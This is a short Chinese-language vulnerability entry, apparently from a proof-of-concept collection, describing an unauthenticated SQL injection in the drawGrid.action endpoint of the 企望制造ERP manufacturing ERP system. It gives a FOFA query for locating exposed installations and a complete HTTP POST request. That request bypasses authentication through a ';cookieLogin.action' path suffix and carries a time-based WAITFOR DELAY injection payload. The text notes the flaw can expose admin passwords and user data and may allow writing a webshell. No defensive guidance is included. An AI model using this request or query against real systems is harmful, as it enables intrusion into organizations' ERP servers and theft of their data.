# 企望制造ERP系统drawGrid.action存在SQL漏洞

企望制造ERP系统 drawGrid.action 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
title="企望制造ERP系统"
```

## poc

```javascript
POST /mainFunctions/drawGrid.action;cookieLogin.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close

tablename=1';WAITFOR DELAY '0:0:5'--
```

![image-20241114140739587](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141407656.png)